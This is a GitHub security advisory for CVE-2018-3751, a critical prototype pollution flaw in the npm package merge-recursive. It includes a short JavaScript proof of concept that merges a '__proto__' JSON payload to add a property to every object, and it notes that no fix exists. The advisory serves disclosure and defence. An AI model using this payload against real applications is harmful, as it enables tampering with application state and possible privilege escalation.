# [C] Prototype Pollution in merge-recursive

## Summary
Severity: Critical
Advisory: GHSA-cvxm-f295-x957
CVE: CVE-2018-3751
CWE: CWE-20
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2018-09-18
Source: https://github.com/advisories/GHSA-cvxm-f295-x957
Type: github-advisory

## Affected
- npm: `merge-recursive` — affected >=0

## Details
All versions of `merge-recursive` are vulnerable to Prototype Pollution. When malicious user input is merged with another object it allows the attacker to modify the prototype of Object via `__proto__` causing the addition or modification of an existing property.

Proof of concept:

```js
var merge = require('merge-recursive').recursive;
var malicious_payload = '{"__proto__":{"oops":"It works !"}}';

var a = {};
console.log("Before : " + a.oops);
merge({}, JSON.parse(malicious_payload));
console.log("After : " + a.oops);
```


## Recommendation

There is currently no fix available.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2018-3751
- https://hackerone.com/reports/311337
- https://github.com/advisories/GHSA-cvxm-f295-x957
- https://www.npmjs.com/advisories/715
